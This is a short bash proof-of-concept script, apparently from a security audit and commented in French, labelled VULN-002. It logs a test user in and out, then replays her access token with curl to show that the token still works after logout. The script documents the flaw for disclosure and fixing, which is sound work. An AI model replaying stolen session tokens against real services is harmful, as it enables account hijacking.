#!/usr/bin/env bash
# VULN-002 — PoC : l'access token reste utilisable après la déconnexion
source "$(dirname "$0")/../outils/common.sh"
setup_accounts

echo "=== 1. Alice se connecte"
LOGIN=$(post /auth/login '{"email":"alice@corp.test","password":"AlicePass123!"}')
ACCESS=$(echo "$LOGIN" | field accessToken)
REFRESH=$(echo "$LOGIN" | field refreshToken)
echo "$LOGIN" | short

echo
echo "=== 2. Alice se déconnecte"
echo "POST /auth/logout  {\"refreshToken\":\"<son refresh token>\"}"
post /auth/logout "{\"refreshToken\":\"$REFRESH\"}"
echo

echo
echo "=== 3. Un attaquant qui a volé l'access token l'utilise APRÈS la déconnexion"
echo "GET /user/profile  Authorization: Bearer <access token d'Alice>"
curl -s -w "\nHTTP %{http_code}\n" "$BASE/user/profile" -H "Authorization: Bearer $ACCESS"
